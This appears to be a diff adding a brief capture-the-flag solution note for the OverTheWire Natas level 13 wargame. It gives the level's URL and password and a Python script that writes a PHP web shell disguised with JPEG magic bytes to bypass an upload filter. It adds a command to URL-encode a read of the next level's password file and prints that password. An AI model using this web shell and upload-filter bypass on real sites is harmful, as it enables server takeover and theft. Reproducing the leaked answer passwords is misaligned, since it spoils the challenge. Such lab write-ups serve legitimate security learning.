@@ -1,0 +1,18 @@
+http://natas13.natas.labs.overthewire.org/
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+Write a php shell with jpg magic bytes to it
+
+import binascii
+mb = "FF D8 FF DB".replace(' ', '')
+payload = "<?php echo system($_GET['cmd']); ?>"
+
+with open('a.php', 'wb') as f:
+    f.write(binascii.unhexlify(mb))
+    f.write(payload.encode())
+
+
+then just url safe encode the command to fetch password:
+python -c 'from urllib import quote;print(quote("cat /etc/natas_webpass/natas14"));'
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
